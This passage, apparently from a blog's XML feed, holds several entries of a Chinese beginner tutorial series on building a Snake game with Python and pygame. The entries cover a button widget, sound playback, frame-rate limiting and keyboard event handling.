MOUSEBUTTONDOWN, MOUSEMOTION</span><br><span class="line"><span class="keyword">from</span> pygame <span class="keyword">import</span> Rect</span><br><span class="line"></span><br><span class="line">pygame.init()</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Button 控件</span></span><br><span class="line"><span class="string">-----------</span></span><br><span class="line"><span class="string">为pygame 绘制一个button</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Button</span>:</span></span><br><span class="line">    NORMAL = <span class="number">0</span></span><br><span class="line">    CLICKED = <span class="number">1</span></span><br><span class="line">    HOVER = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    pos = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    font = pygame.font.SysFont(<span class="string">'arial'</span>, <span class="number">16</span>)</span><br><span class="line">    click = <span class="keyword">None</span></span><br><span class="line">    surface_normal = <span class="keyword">None</span></span><br><span class="line">    surface_hover = <span class="keyword">None</span></span><br><span class="line">    surface_clicked = <span class="keyword">None</span></span><br><span class="line">    status = NORMAL</span><br><span class="line">    text = <span class="string">'Button'</span></span><br><span class="line">    box = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, text, callable)</span>:</span></span><br><span class="line">        self.click = callable</span><br><span class="line">        self.text = text</span><br><span class="line">        self._gen_surface()</span><br><span class="line">        self.box = Rect(self.pos, self.surface_normal.get_size())</span><br><span class="line"></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    绘制按钮</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_draw</span><span class="params">(self, screen)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.status == Button.HOVER:</span><br><span class="line">            screen.blit(self.surface_hover, self.pos)</span><br><span class="line">        <span class="keyword">elif</span> self.status == Button.CLICKED:</span><br><span class="line">            screen.blit(self.surface_clicked, self.pos)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            screen.blit(self.surface_normal, self.pos)</span><br><span class="line"></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    监控事件</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_event</span><span class="params">(self, event)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> event.type == MOUSEBUTTONDOWN:</span><br><span class="line">            <span class="keyword">if</span> self._in_button_box(event.pos, self.box):</span><br><span class="line">                self.status = self.CLICKED</span><br><span class="line">                self.click()</span><br><span class="line">        <span class="keyword">elif</span> event.type == MOUSEMOTION:</span><br><span class="line">            <span class="keyword">if</span> self._in_button_box(event.pos, self.box):</span><br><span class="line">                self.status = self.HOVER</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.status = self.NORMAL</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.status = self.NORMAL</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_gen_surface</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.surface_normal = self.font.render(self.text, <span class="keyword">True</span>, (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        self.surface_hover = self.font.render(self.text, <span class="keyword">True</span>, (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>),</span><br><span class="line">                                              (<span class="number">0xee</span>, <span class="number">0xee</span>, <span class="number">0xee</span>))</span><br><span class="line">        self.surface_clicked = self.font.render(self.text, <span class="keyword">True</span>, (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>),</span><br><span class="line">                                                (<span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x22</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_in_button_box</span><span class="params">(self, point, box)</span>:</span></span><br><span class="line">        p_x, p_y = point</span><br><span class="line">        x, y, w, h = box</span><br><span class="line">        <span class="keyword">if</span> p_x &gt;= x <span class="keyword">and</span> p_x &lt;= x + w:</span><br><span class="line">            <span class="keyword">if</span> p_y &gt;= y <span class="keyword">and</span> p_y &lt;= y + h:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> 基础教程 </category>
          
          <category> Python贪吃蛇教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> pygame </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>05 贪吃蛇 - 音频加载与播放：音频处理</title>
      <link href="/2018/07/09/snake-sound/"/>
      <url>/2018/07/09/snake-sound/</url>
      <content type="html"><![CDATA[<p>看了下pygame的介绍，发现居然是！！SDL！！2014年一直玩的东西，打算水完Python系列以后，再水一下用SDL2来做一个贪吃蛇，很久没弄了。</p><a id="more"></a><p>要播放音频，和显示文字差不多，基本的步骤如下：</p><ol><li>初始化音频</li><li>加载音频</li><li>播放音频</li></ol><p>具体代码如下：</p><h2 id="播放音效代码"><a href="#播放音效代码" class="headerlink" title="播放音效代码"></a>播放音效代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame </span><br><span class="line"><span class="keyword">from</span> pygame <span class="keyword">import</span> QUIT,KEYDOWN</span><br><span class="line"><span class="keyword">from</span> pygame.mixer <span class="keyword">import</span> Sound</span><br><span class="line"><span class="comment"># 1. 先初始化游戏框架</span></span><br><span class="line">pygame.init()</span><br><span class="line"><span class="comment"># 2. 创建一个窗口</span></span><br><span class="line">screen = pygame.display.set_mode((<span class="number">300</span>,<span class="number">150</span>),<span class="number">0</span>,<span class="number">32</span>)</span><br><span class="line"><span class="comment"># 加载字体 (使用系统字体)</span></span><br><span class="line">font = pygame.font.SysFont(<span class="string">'arial'</span>, <span class="number">16</span>)</span><br><span class="line"><span class="comment"># 运行标志</span></span><br><span class="line">running = <span class="keyword">True</span></span><br><span class="line">text = <span class="string">'Play music with any keydown'</span></span><br><span class="line"></span><br><span class="line">clock = pygame.time.Clock()</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">初始化音频播放器</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># 初始化</span></span><br><span class="line">pygame.mixer.init()</span><br><span class="line"><span class="comment"># 加载音效</span></span><br><span class="line">sound=Sound(<span class="string">'eat.wav'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 游戏死循环</span></span><br><span class="line"><span class="keyword">while</span> running:</span><br><span class="line">    <span class="comment"># 2. 获取事件流</span></span><br><span class="line">    <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">        <span class="comment"># 3. 处理事件流</span></span><br><span class="line">        <span class="keyword">if</span> event.type == QUIT:</span><br><span class="line">            <span class="comment"># 结束运行</span></span><br><span class="line">            running = <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">elif</span> event.type == KEYDOWN:</span><br><span class="line">            <span class="comment"># 播放音频</span></span><br><span class="line">            sound.play()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2.1 屏幕填充白色 (Red,Green,Blue) 颜色取值范围：0~0xff</span></span><br><span class="line">    screen.fill((<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>))</span><br><span class="line">    <span class="comment"># 2.3 渲染文字</span></span><br><span class="line">    text_surface = font.render(text  ,<span class="keyword">True</span>,(<span class="number">0xff</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">    <span class="comment"># 2.4 贴图文字</span></span><br><span class="line">    screen.blit(text_surface,(<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">    <span class="comment"># 3. 刷新显示窗口</span></span><br><span class="line">    pygame.display.flip() </span><br><span class="line">    clock.tick(<span class="number">60</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 退出框架</span></span><br><span class="line">pygame.quit()</span><br></pre></td></tr></table></figure><h3 id="方法说明"><a href="#方法说明" class="headerlink" title="方法说明"></a>方法说明</h3><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>play(loops=0, maxtime=0, fade_ms=0) -&gt; Channel</td><td>开始音频播放</td></tr><tr><td>stop() -&gt; None</td><td>结束音频播放</td></tr><tr><td>fadeout(time) -&gt; None</td><td>播放淡出</td></tr><tr><td>set_volume(value) -&gt; None</td><td>设置播放音量，0.0 ~ 1.0</td></tr><tr><td>get_volume() -&gt; value</td><td>获取播放音量</td></tr><tr><td>get_num_channels() -&gt; count</td><td>计算声音播放次数</td></tr><tr><td>get_length() -&gt; seconds</td><td>计算音频长度</td></tr><tr><td>get_raw() -&gt; bytes</td><td>获取声音二进制原始数据</td></tr></tbody></table>]]></content>
      
      <categories>
          
          <category> 基础教程 </category>
          
          <category> Python贪吃蛇教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> pygame </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>04 贪吃蛇 - 帧率限制：限制显示速率</title>
      <link href="/2018/07/08/snake-show-and-control-fps/"/>
      <url>/2018/07/08/snake-show-and-control-fps/</url>
      <content type="html"><![CDATA[<p>在一个游戏中，显示的控制也是一个比较重要的东西，在不同的机器上，界面刷新的频率不一样（也就是fps不一样），这样照成的结果就是<br>在不同情况下，基于帧的动画的效果会不同，本次将控制帧率</p><a id="more"></a><h2 id="显示帧率"><a href="#显示帧率" class="headerlink" title="显示帧率"></a>显示帧率</h2><p>一般来说，pygame提供了一个控制帧率的方法，但是在低端机会照成帧率跟不上的情况，我们先显示一下帧率</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame </span><br><span class="line"><span class="keyword">from</span> pygame <span class="keyword">import</span> QUIT</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 先初始化游戏框架</span></span><br><span class="line">pygame.init()</span><br><span class="line"><span class="comment"># 2. 创建一个窗口</span></span><br><span class="line">screen = pygame.display.set_mode((<span class="number">300</span>,<span class="number">150</span>),<span class="number">0</span>,<span class="number">32</span>)</span><br><span class="line"><span class="comment"># 加载字体 (使用系统字体)</span></span><br><span class="line">font = pygame.font.SysFont(<span class="string">'arial'</span>, <span class="number">16</span>)</span><br><span class="line"><span class="comment"># 运行标志</span></span><br><span class="line">running = <span class="keyword">True</span></span><br><span class="line"><span class="comment"># 案件方向</span></span><br><span class="line">mouse  = (<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">mouse_move = (<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">mouse_key = <span class="keyword">None</span></span><br><span class="line">text = <span class="string">'fps: %s'</span></span><br><span class="line">fps = <span class="number">0</span></span><br><span class="line">FPS_MAX = <span class="number">60</span></span><br><span class="line"></span><br><span class="line">clock = pygame.time.Clock()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 游戏死循环</span></span><br><span class="line"><span class="keyword">while</span> running:</span><br><span class="line">    <span class="comment"># 2. 获取事件流</span></span><br><span class="line">    <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">        <span class="comment"># 3. 处理事件流</span></span><br><span class="line">        <span class="keyword">if</span> event.type == QUIT:</span><br><span class="line">            <span class="comment"># 结束运行</span></span><br><span class="line">            running = <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2.1 屏幕填充白色</span></span><br><span class="line">    screen.fill((<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>))</span><br><span class="line">    <span class="comment"># 2.3 渲染文字</span></span><br><span class="line">    text_surface = font.render(text % fps ,<span class="keyword">True</span>,(<span class="number">0xff</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">    <span class="comment"># 2.4 贴图文字</span></span><br><span class="line">    screen.blit(text_surface,(<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">    <span class="comment"># 3. 刷新显示窗口</span></span><br><span class="line">    pygame.display.flip() </span><br><span class="line">    passed_time = clock.tick() </span><br><span class="line">    print(passed_time)</span><br><span class="line">    <span class="keyword">if</span> passed_time &lt;=<span class="number">0</span> :</span><br><span class="line">        passed_time = <span class="number">1</span></span><br><span class="line">    fps =  int(<span class="number">1</span>/passed_time*<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 退出框架</span></span><br><span class="line">pygame.quit()</span><br></pre></td></tr></table></figure><p><em>帧率</em></p><p><img src="4-1.png" alt=""></p><p>因为我们没有进行什么比较消耗时间的操作，帧率非常快，1秒钟刷新了1000次左右，现在我们来限制帧率</p><h2 id="使用-tick-限制帧率"><a href="#使用-tick-限制帧率" class="headerlink" title="使用 tick 限制帧率"></a>使用 tick 限制帧率</h2><p>在pygame中，tick方法可以限制最高帧率 (Frame Per Second)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame </span><br><span class="line"><span class="keyword">from</span> pygame <span class="keyword">import</span> QUIT</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 先初始化游戏框架</span></span><br><span class="line">pygame.init()</span><br><span class="line"><span class="comment"># 2. 创建一个窗口</span></span><br><span class="line">screen = pygame.display.set_mode((<span class="number">300</span>,<span class="number">150</span>),<span class="number">0</span>,<span class="number">32</span>)</span><br><span class="line"><span class="comment"># 加载字体 (使用系统字体)</span></span><br><span class="line">font = pygame.font.SysFont(<span class="string">'arial'</span>, <span class="number">16</span>)</span><br><span class="line"><span class="comment"># 运行标志</span></span><br><span class="line">running = <span class="keyword">True</span></span><br><span class="line"><span class="comment"># 案件方向</span></span><br><span class="line">mouse  = (<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">mouse_move = (<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">mouse_key = <span class="keyword">None</span></span><br><span class="line">text = <span class="string">'fps: %s'</span></span><br><span class="line">fps = <span class="number">0</span></span><br><span class="line">FPS_MAX = <span class="number">60</span></span><br><span class="line"></span><br><span class="line">clock = pygame.time.Clock()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_fps</span><span class="params">(passed_time)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> passed_time &lt;=<span class="number">0</span> :</span><br><span class="line">        passed_time = <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> int(<span class="number">1</span>/passed_time*<span class="number">1000</span>)</span><br><span class="line"><span class="comment"># 1. 游戏死循环</span></span><br><span class="line"><span class="keyword">while</span> running:</span><br><span class="line">    <span class="comment"># 2. 获取事件流</span></span><br><span class="line">    <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">        <span class="comment"># 3. 处理事件流</span></span><br><span class="line">        <span class="keyword">if</span> event.type == QUIT:</span><br><span class="line">            <span class="comment"># 结束运行</span></span><br><span class="line">            running = <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2.1 屏幕填充白色</span></span><br><span class="line">    screen.fill((<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>))</span><br><span class="line">    <span class="comment"># 2.3 渲染文字</span></span><br><span class="line">    text_surface = font.render(text % fps ,<span class="keyword">True</span>,(<span class="number">0xff</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">    <span class="comment"># 2.4 贴图文字</span></span><br><span class="line">    screen.blit(text_surface,(<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">    <span class="comment"># 3. 刷新显示窗口</span></span><br><span class="line">    pygame.display.flip() </span><br><span class="line">    <span class="comment">## 限制最高帧率</span></span><br><span class="line">    passed_time = clock.tick(FPS_MAX) </span><br><span class="line">    fps = get_fps(passed_time)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 退出框架</span></span><br><span class="line">pygame.quit()</span><br></pre></td></tr></table></figure><p><img src="4-2.png" alt=""></p><h2 id="手动限制帧率"><a href="#手动限制帧率" class="headerlink" title="手动限制帧率"></a>手动限制帧率</h2><p>如果没有 tick 方法的话，我们可以通过计算时间来限制帧率</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame </span><br><span class="line"><span class="keyword">from</span> pygame <span class="keyword">import</span> QUIT</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 先初始化游戏框架</span></span><br><span class="line">pygame.init()</span><br><span class="line"><span class="comment"># 2. 创建一个窗口</span></span><br><span class="line">screen = pygame.display.set_mode((<span class="number">300</span>,<span class="number">150</span>),<span class="number">0</span>,<span class="number">32</span>)</span><br><span class="line"><span class="comment"># 加载字体 (使用系统字体)</span></span><br><span class="line">font = pygame.font.SysFont(<span class="string">'arial'</span>, <span class="number">16</span>)</span><br><span class="line"><span class="comment"># 运行标志</span></span><br><span class="line">running = <span class="keyword">True</span></span><br><span class="line"><span class="comment"># 案件方向</span></span><br><span class="line">mouse  = (<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">mouse_move = (<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">mouse_key = <span class="keyword">None</span></span><br><span class="line">text = <span class="string">'fps: %s'</span></span><br><span class="line">fps = <span class="number">0</span></span><br><span class="line">FPS_MAX = <span class="number">60</span></span><br><span class="line">fps_time = <span class="number">1000</span>/FPS_MAX;</span><br><span class="line"></span><br><span class="line">clock = pygame.time.Clock()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_fps</span><span class="params">(passed_time)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> passed_time &lt;=<span class="number">0</span> :</span><br><span class="line">        passed_time = <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> int(<span class="number">1</span>/passed_time*<span class="number">1000</span>)</span><br><span class="line"><span class="comment"># 1. 游戏死循环</span></span><br><span class="line"><span class="keyword">while</span> running:</span><br><span class="line">    start_time = pygame.time.get_ticks()</span><br><span class="line">    <span class="comment"># 2. 获取事件流</span></span><br><span class="line">    <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">        <span class="comment"># 3. 处理事件流</span></span><br><span class="line">        <span class="keyword">if</span> event.type == QUIT:</span><br><span class="line">            <span class="comment"># 结束运行</span></span><br><span class="line">            running = <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2.1 屏幕填充白色</span></span><br><span class="line">    screen.fill((<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>))</span><br><span class="line">    <span class="comment"># 2.3 渲染文字</span></span><br><span class="line">    text_surface = font.render(text % fps ,<span class="keyword">True</span>,(<span class="number">0xff</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">    <span class="comment"># 2.4 贴图文字</span></span><br><span class="line">    screen.blit(text_surface,(<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">    <span class="comment"># 3. 刷新显示窗口</span></span><br><span class="line">    pygame.display.flip() </span><br><span class="line">    <span class="comment">## 限制最高帧率</span></span><br><span class="line">    passed_time = pygame.time.get_ticks() - start_time</span><br><span class="line">    <span class="keyword">if</span>  fps_time &gt; passed_time:</span><br><span class="line">        pygame.time.wait(int(fps_time - passed_time))</span><br><span class="line">    passed_time = pygame.time.get_ticks() - start_time</span><br><span class="line">    fps = get_fps(passed_time)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 退出框架</span></span><br><span class="line">pygame.quit()</span><br></pre></td></tr></table></figure><p><img src="4-3.png" alt=""></p>]]></content>
      
      <categories>
          
          <category> 基础教程 </category>
          
          <category> Python贪吃蛇教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> pygame </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>03 贪吃蛇 - 事件获取与处理：处理事件</title>
      <link href="/2018/07/07/snake-event/"/>
      <url>/2018/07/07/snake-event/</url>
      <content type="html"><![CDATA[<p>一个游戏不仅仅要能够显示出画面啊，还得接受事件并处理不是么，本次显示一波事件</p><a id="more"></a><h2 id="处理退出事件"><a href="#处理退出事件" class="headerlink" title="处理退出事件"></a>处理退出事件</h2><p>现在开始，游戏的界面都是死循环了，得退出一波，先创建一个标志位，表示游戏正在运行，事件处理流程：</p><ol><li>游戏死循环</li><li>获取事件流</li><li>处理事件流</li></ol><p>实现代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame </span><br><span class="line"><span class="comment"># 1. 先初始化游戏框架</span></span><br><span class="line">pygame.init()</span><br><span class="line"><span class="comment"># 2. 创建一个窗口</span></span><br><span class="line">screen = pygame.display.set_mode((<span class="number">200</span>,<span class="number">150</span>),<span class="number">0</span>,<span class="number">32</span>)</span><br><span class="line"><span class="comment"># 加载字体 (使用系统字体)</span></span><br><span class="line">font = pygame.font.SysFont(<span class="string">'arial'</span>, <span class="number">16</span>)</span><br><span class="line"><span class="comment"># 运行标志</span></span><br><span class="line">running = <span class="keyword">True</span></span><br><span class="line"><span class="comment"># 1. 游戏死循环</span></span><br><span class="line"><span class="keyword">while</span> running:</span><br><span class="line">    <span class="comment"># 2. 获取事件流</span></span><br><span class="line">    <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">        <span class="comment"># 3. 处理事件流</span></span><br><span class="line">        <span class="keyword">if</span> event.type == pygame.QUIT:</span><br><span class="line">            print(<span class="string">'quit game'</span>)</span><br><span class="line">            <span class="comment"># 结束运行</span></span><br><span class="line">            running = <span class="keyword">False</span></span><br><span class="line">    <span class="comment"># 2.1 屏幕填充白色</span></span><br><span class="line">    screen.fill((<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>))</span><br><span class="line">    <span class="comment"># 2.3 渲染文字</span></span><br><span class="line">    text = font.render(<span class="string">"Hello World"</span> ,<span class="keyword">True</span>,(<span class="number">0xff</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">    <span class="comment"># 2.4 贴图文字</span></span><br><span class="line">    screen.blit(text,(<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">    <span class="comment"># 3. 刷新显示窗口</span></span><br><span class="line">    pygame.display.flip()  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 退出框架</span></span><br><span class="line">pygame.quit()</span><br></pre></td></tr></table></figure><h2 id="处理键盘事件"><a href="#处理键盘事件" class="headerlink" title="处理键盘事件"></a>处理键盘事件</h2><p>键盘事件的类型为 <code>KEYDOWN</code> 或者 <code>KEYUP</code>， 我们使用的时候一般使用 <code>KEYDOWN</code> 作为触发点：<br>本程序实例将监控上下左右键，并显示在屏幕上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame </span><br><span class="line"><span class="keyword">from</span> pygame <span class="keyword">import</span> K_UP,K_DOWN,K_LEFT,K_RIGHT,QUIT,KEYDOWN</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 先初始化游戏框架</span></span><br><span class="line">pygame.init()</span><br><span class="line"><span class="comment"># 2. 创建一个窗口</span></span><br><span class="line">screen = pygame.display.set_mode((<span class="number">200</span>,<span class="number">150</span>),<span class="number">0</span>,<span class="number">32</span>)</span><br><span class="line"><span class="comment"># 加载字体 (使用系统字体)</span></span><br><span class="line">font = pygame.font.SysFont(<span class="string">'arial'</span>, <span class="number">16</span>)</span><br><span class="line"><span class="comment"># 运行标志</span></span><br><span class="line">running = <span class="keyword">True</span></span><br><span class="line"><span class="comment"># 案件方向</span></span><br><span class="line">text  = <span 